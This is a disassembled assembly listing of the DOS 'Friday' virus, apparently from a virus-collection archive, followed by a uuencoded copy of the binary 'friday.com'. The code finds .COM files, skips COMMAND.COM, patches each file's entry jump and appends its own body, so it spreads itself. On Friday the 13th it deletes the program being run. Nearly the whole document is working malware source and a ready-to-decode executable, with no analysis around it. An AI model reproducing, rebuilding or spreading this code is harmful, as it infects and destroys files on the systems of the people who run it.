PAGE  59,132

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                                      ;;
;;;                 FRIDAY                       ;;
;;;                                      ;;
;;;      Created:   14-Jan-91                            ;;
;;;      Version:                                ;;
;;;      Passes:    9          Analysis Options on: QRS              ;;
;;;                                      ;;
;;;                                      ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

data_1e     equ 2Ch         ; (77C7:002C=0)
data_2e     equ 80h         ; (77C7:0080=0)
data_16e    equ 4F43h           ; (77C7:4F43=0)

seg_a       segment byte public
        assume  cs:seg_a, ds:seg_a


        org 100h

friday      proc    far

start:
        jmp loc_1           ; (0510)
data_5      db  90h         ;  xref 77C7:05E0, 05ED, 05F7, 0658
                        ;            0691
data_6      dw  9090h           ;  xref 77C7:0606
data_8      db  90h         ;  xref 77C7:05F4, 0631
data_9      dw  9090h           ;  xref 77C7:061E, 063D
data_10     db  90h         ;  xref 77C7:059B
        db   90h, 90h, 90h, 90h, 90h
data_11     db  90h         ;  xref 77C7:0592
        db  25 dup (90h)
data_12     dw  9090h           ;  xref 77C7:05FD
        db   90h, 90h
data_13     db  90h         ;  xref 77C7:05BF, 05D4
        db  12 dup (90h)
data_14     db  90h         ;  xref 77C7:05C2
        db  955 dup (90h)
        db  0B4h, 4Ch,0A0h,0FEh, 04h,0CDh
        db   21h, 00h, 00h, 00h,0E9h, 2Dh
        db   0Dh,0BAh,0DAh, 0Ah, 3Dh, 05h
        db   00h, 74h, 1Bh,0BAh,0BFh, 0Ah
        db   3Dh, 02h
loc_1:                      ;  xref 77C7:0100
        jmp short loc_2     ; (0556)
        nop
        jmp $+3F6h
        jmp $+410h
        sub ch,ds:data_16e      ; (77C7:4F43=0)
        dec bp
        add [bp+si],al
        db  8 dup (3Fh)
        db   43h, 4Fh, 4Dh, 00h, 08h, 00h
        db   00h, 00h, 2Eh, 8Bh, 26h, 68h
        db   20h, 6Eh, 80h, 68h, 15h, 00h
        db   04h, 00h, 00h
        db  'SWILL.COM'

        db   00h, 4Fh, 4Dh, 00h
        db  'COMMAND.COM'

        db  0
loc_2:                      ;  xref 77C7:0510
        push    cs
        push    ax
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    bp
        push    ds
        mov bp,sp
        mov word ptr [bp+10h],100h
        call    sub_1           ; (056A)

friday      endp

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;
;         Called from:   77C7:0567
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_1       proc    near
        pop ax
        sub ax,5Ah
        nop
        mov cl,4
        shr ax,cl           ; Shift w/zeros fill
        mov bx,cs
        add ax,bx
        sub ax,10h
        push    ax
        mov ax,170h
        push    ax
        retf
sub_1       endp

        mov ax,cs
        mov ds,ax
        call    sub_2           ; (058D)
        call    sub_4           ; (0663)
        jmp loc_12          ; (0691)

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;
;         Called from:   77C7:0584
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_2       proc    near
        push    es
        push    ds
        pop es
        mov ah,1Ah
        mov dx,offset data_11   ; (77C7:010F=90h)
        int 21h         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        mov ah,4Eh          ; 'N'
        xor cx,cx           ; Zero register
        mov dx,offset data_10   ; (77C7:0109=90h)
        int 21h         ; DOS Services  ah=function 4Eh
                        ;  find 1st filenam match @ds:dx
        jc  loc_4           ; Jump if carry Set
loc_3:                      ;  xref 77C7:05A9
        call    sub_3           ; (05BA)
        mov ah,4Fh          ; 'O'
        int 21h         ; DOS Services  ah=function 4Fh
                        ;  find next filename match
        jnc loc_3           ; Jump if carry=0
loc_4:                      ;  xref 77C7:05A0
        pop ax
        push    ax
        push    ds
        mov ds,ax
        mov ah,1Ah
        mov dx,data_2e      ; (77C7:0080=0)
        int 21h         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        pop ds
        pop es
        retn
sub_2       endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;
;         Called from:   77C7:05A2
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_3       proc    near
        push    es
        mov ax,ds
        mov es,ax
        mov si,offset data_13   ; (77C7:012D=90h)
        mov di,offset data_14   ; (77C7:013A=90h)
        mov cx,0Ch
        cld             ; Clear direction
        repe    cmpsb           ; Rep zf=1+cx >0 Cmp [si] to es:[di]
        pop es
        jnz loc_5           ; Jump if not zero
        jmp loc_ret_10      ; (0662)
loc_5:                      ;  xref 77C7:05CC
        mov ax,3D02h
        mov dx,offset data_13   ; (77C7:012D=90h)
        int 21h         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        jnc loc_6           ; Jump if carry=0
        jmp loc_9           ; (0660)
loc_6:                      ;  xref 77C7:05D9
        mov bx,ax
        push    word ptr data_5     ; (77C7:0103=9090h)
        push    word ptr data_6+1   ; (77C7:0105=9090h)
        mov ah,3Fh          ; '?'
        mov cx,3
        mov dx,offset data_5    ; (77C7:0103=90h)
        int 21h         ; DOS Services  ah=function 3Fh
                        ;  read file, cx=bytes, to ds:dx
        jc  loc_8           ; Jump if carry Set
        mov al,data_8       ; (77C7:0106=90h)
        cmp data_5,al       ; (77C7:0103=90h)
        jne loc_7           ; Jump if not equal
        mov ax,data_12      ; (77C7:0129=9090h)
        sub ax,198h
        sub ax,3
        cmp data_6,ax       ; (77C7:0104=9090h)
        je  loc_8           ; Jump if equal
loc_7:                      ;  xref 77C7:05FB
        mov ax,4202h
        xor cx,cx           ; Zero register
        xor dx,dx           ; Zero register
        int 21h         ; DOS Services  ah=function 42h
                        ;  move file ptr, cx,dx=offset
        jc  loc_8           ; Jump if carry Set
        or  ax,0Fh
        inc ax
        sub ax,3
        mov data_9,ax       ; (77C7:0107=9090h)
        mov ax,4200h
        xor cx,cx           ; Zero register
        xor dx,dx           ; Zero register
        int 21h         ; DOS Services  ah=function 42h
                        ;  move file ptr, cx,dx=offset
        jc  loc_8           ; Jump if carry Set
        mov ah,40h          ; '@'
        mov cx,3
        mov dx,offset data_8    ; (77C7:0106=90h)
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
        jc  loc_8           ; Jump if carry Set
        mov ax,4201h
        xor cx,cx           ; Zero register
        mov dx,data_9       ; (77C7:0107=9090h)
        int 21h         ; DOS Services  ah=function 42h
                        ;  move file ptr, cx,dx=offset
        jc  loc_8           ; Jump if carry Set
        mov ah,40h          ; '@'
        mov cx,198h
        mov dx,offset ds:[100h] ; (77C7:0100=0E9h)
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
        jc  loc_8           ; Jump if carry Set
        jmp short loc_8     ; (0654)
        db  90h
loc_8:                      ;  xref 77C7:05F2, 060A, 0615, 062A
                        ;            0636, 0643, 064F, 0651
        pop word ptr data_6+1   ; (77C7:0105=9090h)
        pop word ptr data_5     ; (77C7:0103=9090h)
        mov ah,3Eh          ; '>'
        int 21h         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
loc_9:                      ;  xref 77C7:05DB
        jnc loc_ret_10      ; Jump if carry=0

loc_ret_10:                 ;  xref 77C7:05CE, 0660
        retn
sub_3       endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;
;         Called from:   77C7:0587
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_4       proc    near
        push    es
        mov ah,2Ah          ; '*'
        int 21h         ; DOS Services  ah=function 2Ah
                        ;  get date, cx=year, dx=mon/day
        cmp dl,0Dh
        jne loc_11          ; Jump if not equal
        cmp al,5
        jne loc_11          ; Jump if not equal
        xor ax,ax           ; Zero register
        mov cx,7FFFh
        xor di,di           ; Zero register
        mov es,es:data_1e       ; (77C7:002C=0)
        cld             ; Clear direction
        repne   scasw           ; Rep zf=0+cx >0 Scan es:[di] for ax
        jnz loc_11          ; Jump if not zero
        add di,2
        push    ds
        push    es
        pop ds
        mov ah,41h          ; 'A'
        mov dx,di
        int 21h         ; DOS Services  ah=function 41h
                        ;  delete file, name @ ds:dx
        pop ds
loc_11:                     ;  xref 77C7:066B, 066F, 0680
        pop es
        retn
sub_4       endp

loc_12:                     ;  xref 77C7:058A
        mov ax,word ptr data_5  ; (77C7:0103=9090h)
        mov word ptr es:[100h],ax   ; (77C7:0100=0DE9h)
        mov al,byte ptr data_6+1    ; (77C7:0105=90h)
        mov byte ptr es:[102h],al   ; (77C7:0102=4)
        pop ds
        pop bp
        pop di
        pop si
        pop dx
        pop cx
        pop bx
        pop ax
        retf                ; Return far

seg_a       ends



        end start

;;;;;;;;;;;;;;;;;;;; CROSS REFERENCE - KEY ENTRY POINTS ;;;;;;;;;;;;;;;;;;;

    seg:off    type    label
   ---- ----   ----   ---------------
   77C7:0100   far    start

 ;;;;;;;;;;;;;;;;;; Interrupt Usage Synopsis ;;;;;;;;;;;;;;;;;;

        Interrupt 21h :  set DTA to ds:dx
        Interrupt 21h :  get date, cx=year, dx=mon/day
        Interrupt 21h :  open file, al=mode,name@ds:dx
        Interrupt 21h :  close file, bx=file handle
        Interrupt 21h :  read file, cx=bytes, to ds:dx
        Interrupt 21h :  write file cx=bytes, to ds:dx
        Interrupt 21h :  delete file, name @ ds:dx
        Interrupt 21h :  move file ptr, cx,dx=offset
        Interrupt 21h :  find 1st filenam match @ds:dx
        Interrupt 21h :  find next filename match

 ;;;;;;;;;;;;;;;;;; I/O Port Usage Synopsis  ;;;;;;;;;;;;;;;;;;

        No I/O ports used.

begin 775 friday.com
MZ0T$D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0M$R@_@3-(0```.DM#;K:"CT%`'0;
MNK\*/0+K1)#I\P/I#00J+D-/30`"/S\_/S\_/S]#3TT`"````"Z+)F@@;H!H
M%0`$``!35TE,3"Y#3TT`3TT`0T]-34%.1"Y#3TT`#E!04U%25E=5'HOLQT80
M``'H``!8+5H`D+$$T^B,RP/#+1``4+AP`5#+C,B.V.@&`.C9`.D$`08>![0:
MN@\!S2&T3C/)N@D!S2%R">@5`+1/S2%S]UA0'H[8M!JZ@`#-(1\'PP:,V([`
MOBT!OSH!N0P`_/.F!W4#Z9$`N`(]NBT!S2%S`^F"`(O8_S8#`?\V!0&T/[D#
M`+H#`<@^T
M0+F8`;H``<@/K`9"/!@4!CP8#`;0^S2%S`,,&M"K-(8#Z#74B/`5U'C/`
MN?]_,_\FC@8L`/SRKW4-@\<"'@8?M$&+U\TA'P?#H0,!)J,``:`%`2:B`@$?
(75]>6EE;6,L`
`
end
